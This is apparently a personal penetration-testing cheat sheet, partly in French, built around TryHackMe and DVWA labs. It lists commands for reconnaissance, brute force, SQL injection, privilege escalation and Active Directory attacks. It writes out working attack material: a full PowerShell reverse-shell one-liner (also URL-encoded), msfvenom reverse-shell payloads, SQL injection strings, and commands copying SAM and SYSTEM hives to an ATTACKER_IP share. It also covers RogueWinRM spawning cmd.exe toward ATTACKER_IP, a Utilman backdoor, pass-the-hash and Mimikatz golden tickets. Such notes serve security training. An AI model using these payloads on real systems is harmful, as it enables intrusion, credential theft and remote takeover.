<p align="center">
  Pentest-Cheat-Sheet<br>
</p>

##[RECONNAISSANCE PASSIVE / OSINT:]

      Enumeration DNS:
        Lookup WHOIS record	whois tryhackme.com
        Lookup DNS A records	nslookup -type=A tryhackme.com
        Lookup DNS MX records at DNS server	nslookup -type=MX tryhackme.com 1.1.1.1
        Lookup DNS TXT records	nslookup -type=TXT tryhackme.com
        Lookup DNS A records	dig tryhackme.com A
        Lookup DNS MX records at DNS server	dig @1.1.1.1 tryhackme.com MX
        Lookup DNS TXT records	dig tryhackme.com TXT

      dnsdumpster.com
      
      https://github.com/cipher387/osint_stuff_tool_collection

      dnsdumpster (#https://dnsdumpster.com/)
      
      spiderfoot (https://github.com/smicallef/spiderfoot)
      
      Qualys SSL LABS (https://www.ssllabs.com/)
      
      Wappalyzer plugin navigateur (caching = banner grabbing)
      
      Flagfox plugin nav
      
      Hunter.io plugin nav
      
      Omega switch plugin nav
      
      Port Checker plugin
      
      webdevelopper plugin
      
      hackbar plugin pour F12
      
      hacktools plugin ( a recuperer sur github)
      
      copyfish OCR
      
      download all images
      
      ghostery tracker Ad BLOCKER
      
      GHUNT !!!!!
      
      hack-tools
      
      LeakIX
      
      Netlas.IO
      
      LinkGopher
      
      Search by image
      
      aperisolv (https://www.aperisolve.com/)
      
      https://www.lemondeinformatique.fr/actualites/lire-8-outils-osint-pour-le-cyber-renseignement-80484.html

      pentestertools




##[RECONNAISSANCE ACTICE / ENUMERATION]

    -sudo netdiscover -r 192.168.X.X -8 -i eth0 -S
        -S pour le syn
        -R pour le rst
        -A pour l'ack
    (eliminer les mac vmware workstation)
    
    -ping de l'adresse trouvée pour vérifier si ping up 
      vérifier le TTL pour trouver si linux ou windows:
        Unix / Linux – 0-64
        Windows – 65-127
        Cisco/Solaris/AIX – 128-265
        
    nmap -n -vvv -Pn -O -sV 192.x.x.x -oX fichier.xml
      -n = NO DNS resolution 
      -vvv = full verbose
      -Pn = port scan only, no ping
      -O = OS scan fingerprinting
      -sV = Banner Grabbing
      -oX = export de fichier en xml

      nmap -sC -sV -p- -T4 --min-rate=9326 -vv
        sC : run particular scripts on the target and check what all can happen there
        sV : check for the versions
        -p- : check all the ports
        -T4 : it is to speed up things(max is T5)
        — min-rate=9326 : nmap will send the packets at the rate of 9326 per second, this 9326 is just a random number that I got from my Twitter friend
        -vv this stand for very verbose(refers to details) output

    xsltproc fichier.xml -o fichier.html
      transforme l'export xml en html
      
    nmap -sV -O 192.168xx -vvv
      banner grabbing + reconnaissance d'OS si besoin

    IDS / Firewall evasion
        nmap -f 
          fragmente les paquets
          
        sudo nmap --script path-mtu 192.168.x.x (donne le path-mtu)
        nmap ....... -mtu (32,64...)
        
        nmap -data-length 200 192.168.x.x
            change la taille des paquets
    
    nmap --script=http-robot.txt 192.168xx -vvv
        location des scripts NSE (nmap script engine) locate *.nse
    ls /usr/share/nmap/scripts/ | grep ftp 
        pour trouver un script NSE dans l'emplacement des scripts
        
    nmap -sV -script http-sql-injection 192.168.x.x
        Scan des injections sql

    nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.186.19
        Scan pour enumerer les partages samba

    nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.186.19
        Enumerer les partages NFS
        
        
##[CRAWLING]    

    -gobuster
      premiere indexation de repertoires
      cheatsheet = https://linuxcscom.wordpress.com/gobuster/
      
    -dirb http:// 
      juste pour indexer les repertoires
      
    -nikto -host http://192.168..
      recherche de repertoires
      reconnaisance de vulnerabilites
      rechercher dans l'OSVDB
      (https://cdn.comparitech.com/wp-content/uploads/2019/07/NIkto-Cheat-Sheet.pdf)
      
    -Zaproxy (https://github.com/zaproxy/zaproxy)
      webapp scanner
      taper zaproxy puis y pour installer ou apt install zaproxy
      ajouter ajax spider
      ajouter fuzz
      
    -burp

      Proxy pour intercepter (ma requete, mo,n formulailre etc)
      
      Intruder : mode sniper = attaquer un seul champ
                 mode cluster bomb = attaquer plusieurs champs
                 Battering ram = surcharger la ram
                 mode PitchFork = noyer le cluster avec plusieurs payload

                 Add $ (variable) = à poser sur chaque variable que l'on veut bruterforcer, puis dans payloads cela       
                 deviendra ma variable
                 je choisis ensuite mon payload (payload 1 correspond à ma première variable)
                 Dans mon payload settings je vais choisir ma wordlist
                 Je coche ou decoche l'url encodage selon si mes champs de depart sont encodés ou non
                 Je fais pareil pour ma deuxieme variable (mdp par exemple)
                 Je desactive le proxy
                 et je lance mon attaque
                 

    
#[INJECTIONS WEB]


      Brute force
        Avec hydra :
        hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://192.168.46.141/DVWA-master/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=of7vk530l9s8e7rph9oac52923;            security=medium:F=Username and/or password incorrect'      
        -l pour le user (-L si wordlist de user)
        -P wordlist de password (-p password statique)
        'http-getform: urlduformulaire : password et mdp : H=cookie de session:F= reponse en cas de bad user pwd'
        hydra -P <wordlist> -v <ip> <protocol>
        Brute force against a protocol of your choice
        hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>
        You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)
        hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
        Attack a Windows Remote Desktop with a password list.
        hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
        Craft a more specific request for Hydra to brute force.
    
      Inection XSS : 
        xsshunter https://github.com/mandatoryprogrammer/xsshunter-express
        Beef autopown (https://github.com/beefproject/beef/wiki/Autorun-Rule-Engine)
        CHEATSHEET https://github.com/ScriptIdiot/XSS-wordlist/blob/master/XSS-WAF.txt
        
      Injections SQL
        1' or 1=1; --  (pour obtenir tout les records dans la table)
        ' OR 1=1 #
        1' OR '1'='1'# (pour obtenir tout les records dans la table)
       
        Si le #, 99% de chance que le DBMS soit MySQL ou un fork (mariadb etc)
        Si# ok:
        %' or 0=0 union select null, version() # ( connaitre la version de database) ou 1' OR 1=1 UNION SELECT 1, VERSION()#
        1' OR 1=1 UNION SELECT 1,DATABASE() # (connaitre le nom de la DB)
        Utiliser order by pour connaitre le nombre de champ:
            1' ORDER BY 1 #
            1' ORDER BY 2 # etc jusqu'a avoir l'erreur
            Si erreur à 3 = 2champs
            Si erreur à 4 = 3champs etc
        1' OR 1=1 UNION SELECT 1, VERSION()#
        1' OR 1=1 UNION SELECT 1, DATABASE()#
        1' OR 1=1 UNION SELECT  1, table_name FROM information_schema.tables #
        1' OR 1=1 UNION SELECT  1, column_name FROM information_schema.columns  #
        1' OR 1=1 UNION SELECT user, password FROM users(nom de la table) #
        
        SQLMAP
        sqlmap -u "http://192.168.46.141/DVWA-master/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=2t7bspc6qpiu7c1ls66pp0fr34; security=low" --dbs --banner --current-user --current-db --passwords --users
          •	L’argument --dbs pour énumérer le nom des bases de données
          •	L’argument --banner pour afficher la version de base de données
          •	L’argument --current-user pour afficher l’utilisateur connecté au système de gestion de base de données
          •	L’argument --current-db pour afficher la base de données de gestion du système de gestion de base de données
          •	L’argument --users pour afficher le ou les utilisateurs connectés au système de gestion de base de données
          •	L’argument --passwords pour obtenir les hash du mot de passe du ou des utilisateurs connectés au système de gestion de base de données. Cet argument va également essayer de cracker le has des mots de passe.


        sqlmap -u "http://192.168.46.141/DVWA-master/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=2t7bspc6qpiu7c1ls66pp0fr34; security=low" --tables -D dvwa
          •	L’argument -D dvwa pour sélectionner la base de données dvwa
          •	L’argument --tables pour afficher les tables dans cette base


        sqlmap -u "http://192.168.46.141/DVWA-master/vulnerabilities/sqli/?id=3&Submit=Submit#" --cookie="PHPSESSID=2t7bspc6qpiu7c1ls66pp0fr34; security=low" -p id -T users --batch --threads 5 –dump
          •	L’argument -p pour sélectionner le paramètre testable
          •	L’argument -T pour sélectionner la table
          •	L’argument --batch pour éviter de devoir répondre aux questions avec y ou n
          •	L’argument -threads pour limiter le nombre de requêtes http simultanées à 5
          •	L’argument --dump pour afficher les entrées de la table


        https://github.com/sqlmapproject/sqlmap/wiki/Usage (MEILLEUR DES CHEATSHEET)
        https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap CHEATSHEET EXPLICATIVE !!!
        Cheatsheet https://portswigger.net/web-security/sql-injection/cheat-sheet
        https://book.hacktricks.xyz/pentesting-web/sql-injection

       File upload en jpg/png :
         modifier Content-type vers /image/png
         https://wargame.braincoke.fr/labs/dvwa/dvwa-file-upload/
         tout les content type : https://inkplant.com/code/content-type-headers


        

#[SHELL / REVERSE SHELL]

    https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
    https://github.com/flozz/p0wny-shell
    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

    Création de payload MSFVenom
      msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
        ASCService.exe est le nom de l'exe qu'on va remplacer du service ASCService
        sc stop AdvancedSystemCareService9
        copy ASCService C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
        nc -lvnp 4443 sur kali
        sc start AdvancedSystemCareService9 sur le shell

    nc -lnvp 4444
      -l pour démarrer l’écoute des connexions TCP
      -n pour empêcher les résolutions DNS sur l’ip d’écoute
      -v pour obtenir des résultats détaillés
      -p pour lui indiquer le port d’écoute renseigné dans mon reverse shell (4444)

    stabiliser shell python :
      python -c 'import pty;pty.spawn("/bin/bash");'
      python -c 'import pty; pty.spawn("/bin/bash")'
      ctrl + z pour mettre le shell en background
      stty raw -echo  (desactive l'echo)
      fg  (pour remettre le shell en foreground)            
      ENTER
      ENTER
      export TERM=xterm     (pour defininir la variable du shell sur xterm)
      stty cols 132 rows 34  (pour definir le nombre de ligne et colonnes du terminal)

     Stabiliser SHell avec rlwrap
       sudo apt install rlwrap
       rlwrap nc -lvnp <port>
       stty raw -echo; fg

      Stabiliser avec socat
        sudo python3 -m http.server 80
        wget <LOCAL-IP>/socat -O /tmp/socat

      STTY
        stty -a (voir les colu!mns et lignes)
        stty rows <number>
        stty cols <number>

      Connection RDP via linux
        xfreerdp /u:"User name" /v:IP:3389
      
        apt install rdesktop
        rdesktop 192.18.1.21 -f

      POWERSHELL
        powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback =         (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

        Powershell web dans argument cmd
        powershell%20-c%20%22%24client%20%3D%20New-                Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29


#[PRIVESC]   

    POur linux :
        sudo -l pour voir qqchose executable en root
        
        Linpeas pour enum les gtfobins
          SE METTRE DANS LE TMP
          curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
          wget 
    
        gtfobins
          https://gtfobins.github.io/
    
        DirtyCOW
          https://dirtycow.ninja/

     Pour windows :
         WinPEAS
           https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS

         PrivEscCheck : 
           https://github.com/itm4n/PrivescCheck
         
          WES-NG: Windows Exploit Suggester
            https://github.com/bitsadmin/wesng

          MSF exploit suggester:
            multi/recon/local_exploit_suggester

          Powershell script PowerUp 
            https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
            . .\PowerUp.ps1
            Invoke-AllChecks

          NISHANG
            https://github.com/samratashok/nishang
            reverse shell https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
        

#[EXPLOITATION WINDOWS]

    Endroit à regarder :
        C:\Unattend.xml
        C:\Windows\Panther\Unattend.xml
        C:\Windows\Panther\Unattend\Unattend.xml
        C:\Windows\system32\sysprep.inf
        C:\Windows\system32\sysprep\sysprep.xml

    Voir le sprivilges de mon user :
        whoami /priv

    Voir historique commande powershell (via cmd)
        type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

    Save creds 
        cmdkey /list
        runas :
          runas /savecred /user:admin cmd.exe

    IIS confgiguration
          trouver configuration database IIS (via cmd)
            type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

    Retrouver creds putty (via cmd)
          reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

    Voir la structure d'un service (via cmd)
           sc qc "nom du service"

    Voir les permissions d'un executable ou d'nu service (via cmd)
          icacls C:\PROGRA~2\SYSTEM~1\WService.exe

    Injecter un payload dans un service windows
          C:\> cd C:\PROGRA~2\SYSTEM~1\

          C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
                  1 file(s) moved.
          
          C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
                  1 file(s) moved.
          
          C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F   (donne les full permissions à tout le monde)
                  Successfully processed 1 files.
          C:\> sc stop windowsscheduler
          C:\> sc start windowsscheduler

      Checker les DACL (permissions, qui peut acceder à une ressource donnée)
          C:\tools\AccessChk> accesschk64.exe -qlc thmservice

      Changer le path executable d'un service
          sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem

      Exporter la base SAM et la base SYSTEM
          C:\> reg save hklm\system C:\Users\THMBackup\system.hive
          The operation completed successfully.
          
          C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
          The operation completed successfully.

      Créer un partage samba sur linux
          user@attackerpc$ mkdir share
          user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
          C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
          C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

      Impacket pour dumper les hash de la base SAM
          user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
          Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
          
          [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
          [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
          Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
          
      Impacket pour attaquer via PASS THE HASH
          user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.120.172
          Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
          
          [*] Requesting shares on 10.10.175.90.....
          [*] Found writable share ADMIN$
          [*] Uploading file nfhtabqO.exe
          [*] Opening SVCManager on 10.10.175.90.....
          [*] Creating service RoLE on 10.10.175.90.....
          [*] Starting service RoLE.....
          [!] Press help for extra shell commands
          Microsoft Windows [Version 10.0.17763.1821]
          (c) 2018 Microsoft Corporation. All rights reserved.
          
          C:\Windows\system32> whoami
          nt authority\system

      Abuse Utilman.exe
           takeown /f C:\Windows\System32\Utilman.exe
           icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
           C:\Windows\System32\> copy cmd.exe utilman.exe
           Lock scree
           Cela donne un cmd avec le user nt authority\system

           Utiliser RogueWinRM pour obtenir un shell
           nc -lvp 4442
           c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"

    Abuser d'un software vulnerable
            lister les software isntallés via wmic
              wmic product get name,version,vendor
            Rechercher exploit sur exploit-db ou google

    Se connecter à un partage samba :
          smbclient //10.10.186.19/anonymous

    Bloodhound
          https://www.kali.org/tools/bloodhound/
          https://github.com/dirkjanm/BloodHound.py/tree/master

    GOLDEN TICKET Mimikatz:
      LSADUMP::DCSYNC (pour récuperer hash et SID de krbtgt:
            lsadump::dcsync /user:krbtgt

      Création du GOLDEN TICKET:
            kerberos::golden /domain:test.local /sid:S-1-5-21-4151505616-2979182745-695222984-502 /rc4:dafadb2151aefb509c8658738d8eb033               /user:testeurkerb /id:500 /ptt

      Ouverture du CMD en utilisant le GOLDEN TICKET depuis MIMIKATZ:
            MISC::CMD

      runas.exe /netonly /user:<domain>\<username> cmd.exe
            Injecter les credentials dans la mémoire

      En powershell pour set up le DNS et lire le SYSVOL
        $dnsip = "<DC IP>"
        $index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
        Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip

      Enumerer SYSVOL  
        dir \\za.tryhackme.com\SYSVOL\

     Difference dir \\za.tryhackme.com\SYSVOL and dir \\<DC IP>\SYSVOL and why the big fuss about DNS?
        dir \\za.tryhackme.com\SYSVOL == authenth KERBEROS
        dir \\<DC IP>\SYSVOL == AUHTENT NTLM

    Enumeration AD via MMC
      Connexion MMC RTSAT pour accèder aux GPO
          Press Start
          Search "Apps & Features" and press enter
          Click Manage Optional Features
          Click Add a feature
          Search for "RSAT"
          Select "RSAT: Active Directory Domain Services and Lightweight Directory Tools" and click Install
  
          Dans MMC 
          Click File -> Add/Remove Snap-in
          Select and Add all three Active Directory Snap-ins
          Click through any errors and warnings
          Right-click on Active Directory Domains and Trusts and select Change Forest
          Enter za.tryhackme.com as the Root domain and Click OK
          Right-click on Active Directory Sites and Services and select Change Forest
          Enter za.tryhackme.com as the Root domain and Click OK
          Right-click on Active Directory Users and Computers and select Change Domain
          Enter za.tryhackme.com as the Domain and Click OK
          Right-click on Active Directory Users and Computers in the left-hand pane
          Click on View -> Advanced Features

    Enumeration AD via pcommand prompt
          net user /domain
            affiche les users AD
          net user zoe.marshall /domain
            affiche les infos d'un user AD
          net group /domain
            affiche les groupes AD
          net group "Tier 1 Admins" /domain
            affiche les users dans un groupe AD
          net accounts /domain
            affiche la startegie de mot de passe

    Enumeration via Powershell
          Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *
          Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A
          Get-ADGroup -Identity Administrators -Server za.tryhackme.com
          Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com
          PS C:\> $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
          PS C:\> Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com  
          Get-ADDomain -Server za.tryhackme.com
          Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)

    Bypass RSAT
          https://notes.benheater.com/books/active-directory/page/powershell-ad-module-on-any-domain-host-as-any-user?ref=benheater.com

    Emplacement des objets AD supprimés 
          CN=Deleted Objects,DC=za,DC=tryhackme,DC=com

    Tunneling SSH pour obtenir un rdp
          C:\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
          This will establish an SSH session from PC-1 to 1.1.1.1 (Attacker PC) using the tunneluser user.
          Puis sur la kali : munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword

#[BUFFER OVERFLOW]

    https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst

    Immunity debugger :
        Plugin MONA:
            https://github.com/corelan/mona

        

#[METERPRETER]

    Cracket hash de mot de passe windows
            john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt


#[OBFUSCATION]

      PYARMOR
            https://github.com/dashingsoft/pyarmor
            pyarmor gen "nom_du_script"
            Le script obfusqué se place dans le dossier /DIST du répertoire ou est placé le script
            
#[REVERSE ENGINEERING]

      GHIDRA
            https://goopensource.fr/installation-et-utilisation-de-ghidra-reverse-engineering/
            
    
            
           
#[WORDLISTS]

    Mterpreter commands :
            https://www.tntsecurite.ca/wp-content/uploads/2017/08/Commandes-Metasploits-Meterpreter.pdf


            
#[WORDLISTS]

    apt -y install seclists (https://github.com/danielmiessler/SecLists)

#[COMMANDES UTILES]

    x-www-browser index.html
      Pour ouvrir un fichier html en ligne de commande

    xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea
      Connection RDP via linux

    xfreerdp /u:danny.goddard /p:Implementing1995 /v:10.200.58.248 +clipboard

    ssh za.tryhackme.com\\<AD Username>@thmjmp1.za.tryhackme.com

#[SITES UTILES]
    
    Wordpress sécurisation:
      wpmarmite (https://wpmarmite.com/)

    MD5 Decrypt
      https://www.dcode.fr/md5-hash

    Hash identifier
      https://hashes.com/en/tools/hash_identifier

    Générateur d'incident cyber 
      https://github.com/mrwadams/attackgen

    Honeypot ALLINONE teaspot
      (https://github.com/github-rashelbach/-T-Pot-Honeypot) = honeypot all in one

    Github rapport pentest
      https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
      https://github.com/cyber-cfreg/Penetration-Test-Report-Template

#[PORT FORWARDING ET SSH TUNNEL]

    https://github.com/sshuttle/sshuttle

    https://github.com/klsecservices/rpivot

    https://github.com/jpillora/chisel

    https://adepts.of0x.cc/shadowmove-hijack-socket/


